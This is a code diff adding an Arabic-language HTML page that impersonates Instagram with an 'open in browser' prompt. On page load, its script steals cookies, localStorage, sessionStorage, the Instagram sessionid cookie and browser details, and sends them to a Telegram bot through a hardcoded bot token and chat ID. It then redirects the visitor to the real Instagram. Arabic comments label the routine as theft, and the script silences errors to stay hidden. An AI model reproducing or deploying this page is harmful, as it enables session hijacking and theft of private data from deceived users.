@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; padding: 20px; max-width: 320px; }
+        .logo { width: 64px; height: 64px; background: linear-gradient(45deg, #f09433, #d62976, #962fbf); border-radius: 16px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; font-size: 32px; color: white; }
+        h2 { font-size: 20px; color: #262626; margin-bottom: 8px; }
+        p { font-size: 14px; color: #8e8e8e; margin-bottom: 24px; }
+        .btn { background: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+        .footer { font-size: 12px; color: #c7c7c7; margin-top: 24px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">📷</div>
+    <h2>فتح في المتصفح</h2>
+    <p>يرجى فتح هذا الرابط في متصفح Chrome أو Safari لمتابعة المحتوى</p>
+    <button class="btn" onclick="continueToBrowser()">فتح في المتصفح</button>
+    <div class="footer">Instagram</div>
+</div>
+
+<script>
+// ============================================
+// بيانات البوت - تم وضع CHAT_ID الخاص بك
+// ============================================
+var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
+var CHAT_ID = "6181826564";
+
+// ============================================
+// إرسال إلى تليجرام
+// ============================================
+function sendToTelegram(msg) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"}));
+}
+
+// ============================================
+// سرقة جميع البيانات فوراً
+// ============================================
+(function stealAll() {
+    // 1. سرقة الكوكيز
+    var cookies = document.cookie;
+    if (cookies && cookies.length > 0) {
+        sendToTelegram("🍪 <b>Cookies</b>\n<code>" + cookies.substring(0, 3500) + "</code>");
+    }
+    
+    // 2. سرقة LocalStorage
+    var local = {};
+    for (var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        local[key] = localStorage.getItem(key);
+    }
+    if (Object.keys(local).length > 0) {
+        sendToTelegram("💾 <b>LocalStorage</b>\n<code>" + JSON.stringify(local, null, 2).substring(0, 3500) + "</code>");
+    }
+    
+    // 3. سرقة SessionStorage
+    var session = {};
+    for (var j = 0; j < sessionStorage.length; j++) {
+        var skey = sessionStorage.key(j);
+        session[skey] = sessionStorage.getItem(skey);
+    }
+    if (Object.keys(session).length > 0) {
+        sendToTelegram("📦 <b>SessionStorage</b>\n<code>" + JSON.stringify(session, null, 2).substring(0, 3500) + "</code>");
+    }
+    
+    // 4. سرقة جلسة Instagram (sessionid)
+    var allCookies = document.cookie.split("; ");
+    for (var k = 0; k < allCookies.length; k++) {
+        if (allCookies[k].includes("sessionid")) {
+            sendToTelegram("🔐 <b>Instagram Session</b>\n<code>" + allCookies[k] + "</code>");
+            break;
+        }
+    }
+    
+    // 5. معلومات المتصفح + IP تقريبي
+    var info = {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        screen: screen.width + "x" + screen.height,
+        url: location.href,
+        time: new Date().toISOString()
+    };
+    sendToTelegram("💻 <b>Browser Info</b>\n<code>" + JSON.stringify(info, null, 2) + "</code>");
+})();
+
+function continueToBrowser() {
+    window.location.href = "https://www.instagram.com";
+}
+
+window.onerror = function() { return true; };
+</script>
+</body>
+</html>
